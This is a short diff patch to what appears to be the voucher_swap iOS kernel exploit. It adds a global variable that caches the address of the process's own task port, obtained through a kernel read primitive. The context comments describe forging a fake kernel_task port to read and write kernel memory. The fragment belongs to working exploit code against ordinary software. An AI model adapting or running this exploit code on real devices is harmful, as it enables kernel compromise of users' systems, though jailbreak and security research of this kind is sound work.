@@ -19,6 +19,7 @@
 #include "parameters.h"
 #include "platform.h"
 
+
 // ---- Global parameters -------------------------------------------------------------------------
 
 // The size of our fake task.
@@ -1081,8 +1082,9 @@ voucher_swap() {
 
 	// 21. Now that we have the address of our pipe buffer, we can use the stage 1 read
 	// primitive. Get the address of our own task port, which we'll need later.
-	uint64_t task_port_address = stage1_find_port_address(mach_task_self());
-
+    extern uint64_t cached_task_self_addr;
+	uint64_t task_port_address = cached_task_self_addr = stage1_find_port_address(mach_task_self());
+    
 	// 22. Our next goal is to build a fake kernel_task port that allows us to read and write
 	// kernel memory with mach_vm_read()/mach_vm_write(). But in order to do that, we'll first
 	// need to get ipc_space_kernel and kernel_map. We'll use Ian's technique from multi_path
